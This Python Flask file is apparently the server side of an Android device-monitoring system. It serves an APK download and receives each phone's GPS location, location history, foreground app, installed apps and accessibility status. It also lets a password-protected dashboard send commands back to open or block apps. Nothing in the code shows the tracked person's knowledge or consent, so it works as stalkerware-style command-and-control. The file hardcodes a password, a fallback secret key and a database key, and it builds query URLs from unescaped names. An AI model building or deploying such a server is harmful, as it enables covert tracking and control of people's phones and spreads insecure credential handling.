import os
import json
import time
import requests
from flask import Flask, request, jsonify, send_from_directory, session, redirect, url_for, render_template
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

app.secret_key = os.environ.get("SECRET_KEY", "ein_zufaelliger_geheimer_schluessel_123")
GEHEIMES_PASSWORT = "192837465"

# ================= SUPABASE KONFIGURATION =================
SUPABASE_URL = "https://chdjuipbtnmgbmsorhpe.supabase.co"
SUPABASE_KEY = os.environ.get("SUPABASE_KEY", "sb_publishable_bwU_Ywvz9_Od8FPS12mk-w_bscgCvbe")
# ==========================================================

SUPABASE_HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json",
    "Prefer": "resolution=merge-duplicates"
}

def hole_daten_von_supabase():
    try:
        url = f"{SUPABASE_URL}/rest/v1/geraete_daten?select=*"
        antwort = requests.get(url, headers=SUPABASE_HEADERS, timeout=5)
        if antwort.status_code == 200:
            daten_liste = antwort.json()
            geraete_dict = {}
            for geraet in daten_liste:
                name = geraet["name"]
                geraete_dict[name] = {
                    "lat": float(geraet.get("lat", 51.1657)),
                    "lon": float(geraet.get("lon", 10.4515)),
                    "akku": str(geraet.get("akku", "??")),
                    "netzwerk": str(geraet.get("netzwerk", "Aktiv")),
                    "speed": str(geraet.get("speed", "0")),
                    "bedienungshilfen": str(geraet.get("bedienungshilfen", "Unbekannt")),
                    "aktuelle_app": str(geraet.get("aktuelle_app", "Keine")),
                    "installierte_apps": geraet.get("installierte_apps", "[]"),
                    "aktueller_befehl": geraet.get("aktueller_befehl", ""),
                    "historie": geraet.get("historie", []),
                    "zeitstempel": int(geraet.get("zeitstempel", int(time.time())))
                }
            return geraete_dict
    except Exception as e:
        print(f"Fehler beim Laden aus Supabase: {e}")
    return {}

@app.route('/', methods=['GET'])
def index():
    if not session.get('eingeloggt', False):
        return """
        <div style="display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5;">
            <div style="background: white; padding: 40px; border-radius: 12px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center;">
                <h2 style="margin-bottom: 10px; color: #1e293b; font-size: 24px;">🔒 Security Control</h2>
                <p style="color: #64748b; margin-bottom: 25px; font-size: 14px;">Bitte gib das Master-Passwort ein</p>
                <form action="/login" method="POST">
                    <input type="password" name="passwort" placeholder="Passwort eingeben..." required 
                           style="width: 100%; padding: 12px; border: 1px solid #cbd5e1; border-radius: 8px; margin-bottom: 20px; font-size: 16px; box-sizing: border-box; outline: none; transition: border 0.2s;">
                    <button type="submit" style="width: 100%; background: #2563eb; color: white; border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 16px;">Dashboard entsperren</button>
                </form>
            </div>
        </div>
        """
    return render_template('dashboard.html')

# ================= API ENDPUNKTE =================

@app.route('/api/sende_befehl', methods=['POST'])
def speichere_befehl():
    if not session.get('eingeloggt', False):
        return jsonify({"error": "Nicht autorisiert"}), 401
    data = request.get_json() or {}
    geraete_name = data.get("name")
    ziel_paket = data.get("paket")
    # 'oeffne_app' oder 'sperre_app' aus dem Webinterface empfangen
    befehl_typ = data.get("befehl_typ", "oeffne_app") 
    
    befehls_payload = {"befehl": befehl_typ, "paket": ziel_paket}
    try:
        url = f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{geraete_name}"
        res = requests.patch(url, json={"aktueller_befehl": json.dumps(befehls_payload)}, headers=SUPABASE_HEADERS, timeout=5)
        return jsonify({"status": "success" if res.status_code in [200, 204] else "error"})
    except Exception:
        return jsonify({"error": "Fehler"}), 500

@app.route('/api/data', methods=['GET'])
def get_live_data():
    if not session.get('eingeloggt', False):
        return jsonify({}), 401
    return jsonify(hole_daten_von_supabase())

@app.route('/login', methods=['POST'])
def login():
    if request.form.get('passwort') == GEHEIMES_PASSWORT:
        session['eingeloggt'] = True
    return redirect(url_for('index'))

@app.route('/logout')
def logout():
    session.pop('eingeloggt', None)
    return redirect(url_for('index'))

@app.route('/favicon.ico')
def favicon():
    return '', 204

@app.route('/download', methods=['GET'])
def download_apk():
    return send_from_directory(directory='static', path='app.apk', as_attachment=True)

@app.route('/upload', methods=['POST'])
def upload():
    if not request.is_json:
        return jsonify({"status": "error", "message": "Missing JSON", "befehl": "{}"}), 400
        
    try:
        data = request.get_json()
        
        roher_name = str(data.get("name", "Unbekanntes_Geraet")).replace("ä", "ae").replace("ö", "oe").replace("ü", "ue")
        absender_ip = request.remote_addr or "IP"
        geraete_name = f"{roher_name}_{absender_ip[-4:]}"

        try:
            lat, lon = float(data.get("lat", 51.1657)), float(data.get("lon", 10.4515))
        except (TypeError, ValueError):
            lat, lon = 51.1657, 10.4515
            
        akku = str(data.get("akku", "??"))
        netzwerk = str(data.get("netzwerk", "Unbekannt"))
        speed = str(data.get("speed", "0"))
        aktuelle_app = str(data.get("aktuelle_app", "Keine App erkannt")).replace("ä", "ae").replace("ö", "oe").replace("ü", "ue")
        
        installierte_apps = data.get("installierte_apps", "[]")
        if isinstance(installierte_apps, (list, dict)):
            installierte_apps = json.dumps(installierte_apps)
            
        bedienungshilfen = "Aktiv" if aktuelle_app != "Keine App geoeffnet" else "Inaktiv"
        historie, befehl_fuer_handy = [], "{}"
        
        try:
            check_url = f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{geraete_name}&select=historie,aktueller_befehl"
            res = requests.get(check_url, headers=SUPABASE_HEADERS, timeout=5)
            if res.status_code == 200 and len(res.json()) > 0:
                db_eintrag = res.json()[0]
                historie = db_eintrag.get("historie", []) or []
                befehl_fuer_handy = db_eintrag.get("aktueller_befehl", "{}") or "{}"
        except Exception:
            pass

    # Historie erweitern
        if [lat, lon] != [51.1657, 10.4515]:
            historie.append([lat, lon])
            if len(historie) > 15: historie.pop(0)

        payload = {
            "name": geraete_name, "lat": lat, "lon": lon, "akku": akku, "netzwerk": netzwerk,
            "speed": speed, "bedienungshilfen": bedienungshilfen, "aktuelle_app": aktuelle_app,
            "installierte_apps": installierte_apps, "historie": historie, "zeitstempel": int(time.time())
        }

        url = f"{SUPABASE_URL}/rest/v1/geraete_daten?on_conflict=name"
        headers_upsert = SUPABASE_HEADERS.copy()
        headers_upsert["Prefer"] = "return=representation,resolution=merge-duplicates"
        res = requests.post(url, json=payload, headers=headers_upsert, timeout=5)
        
        if res.status_code in [200, 201]:
            if befehl_fuer_handy and befehl_fuer_handy != "{}":
                try: 
                    # Setze Befehl nach erfolgreicher Übermittlung zurück
                    requests.patch(f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{geraete_name}", json={"aktueller_befehl": ""}, headers=SUPABASE_HEADERS, timeout=3)
                except Exception: 
                    pass
            return jsonify({"status": "ok", "befehl": befehl_fuer_handy}), 200
            
        return jsonify({"status": "error", "befehl": "{}"}), 200
        
    except Exception as e:
        print(f"Kritischer Android-Upload-Fehler abgefangen: {e}")
        return jsonify({"status": "error", "befehl": "{}"}), 200

@app.route('/delete/<name>', methods=['GET', 'POST'])
def delete_device(name):
    if session.get('eingeloggt', False):
        try:
            url = f"{SUPABASE_URL}/rest/v1/geraete_daten?name=eq.{name}"
            requests.delete(url, headers=SUPABASE_HEADERS, timeout=5)
        except Exception: pass
    return redirect(url_for('index'))
    
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
